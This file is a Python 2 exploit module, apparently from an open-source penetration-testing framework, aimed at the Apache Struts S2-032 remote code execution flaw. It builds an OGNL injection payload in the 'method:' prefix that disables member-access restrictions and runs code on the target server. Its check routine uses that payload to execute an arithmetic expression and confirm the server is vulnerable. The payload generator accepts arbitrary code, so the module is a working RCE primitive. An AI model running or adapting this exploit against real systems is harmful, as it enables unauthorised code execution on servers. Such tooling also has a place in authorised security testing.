#!/usr/bin/python2
# -*- coding: utf-8 -*-

##
# Current source: https://github.com/open-security/Open-Security-Framework/
##

# from lib.base import module
from lib.core import exploit
import urllib
import requests


class Module(exploit.Exploit):

    meta = {
        'name': 'Apache Struts S2_032 Remote Code Execution',
        'author': 'Open-Security',
        'description': '',
        'comments': '',
        'references': [],
        'license': '',
        'options': {
            'RHOST': ['172.16.176.226', None, 'the target host'],
            'RPORT': [8080, None, 'the target port'],
            'TARGETURI': [
                '/struts2-blank/example/HelloWorld.action',
                None,
                'target uri to request'
            ]
        }
    }

    def __init__(self):
        exploit.Exploit.__init__(self)

    def generate_rce_payload(self, code):
        payload = "method:"
        payload += urllib.quote("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS")
        payload += ","
        payload += urllib.quote(code)
        payload += ","
        payload += urllib.quote("1?#xx:#request.toString")
        return payload

    def check(self):
        int_x = 11
        int_y = 22
        code = "#abcd=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),"
        code += "#abcd.print(#parameters.test[0]),"
        code += "#abcd.print(new java.lang.Integer(%d+%d))," % (int_x, int_y)
        code += "#abcd.print(#parameters.test[0]),"
        code += "#abcd.close()"

        payload = self.generate_rce_payload(code)
        uri = 'http://%s:%s%s' % (self.options['RHOST']['value'],
                                  self.options['RPORT']['value'],
                                  self.options['TARGETURI']['value'])
        self.output("[+] %s - Checking struts2 s2_032 rce..." % uri)

        uri = "%s?%s" % (uri, payload)
        mark = 'aaaa'

        resp = requests.Session().post(uri, data={'test': mark})
        flag = "%s%d%s" % (mark, int_x + int_y, mark)
        if resp and resp.status_code == 200 and flag in resp.text:
            self.output("[+] Target is vulanable")

    def main(self, *args, **kwargs):
        """custom main func for special task"""
        self.check()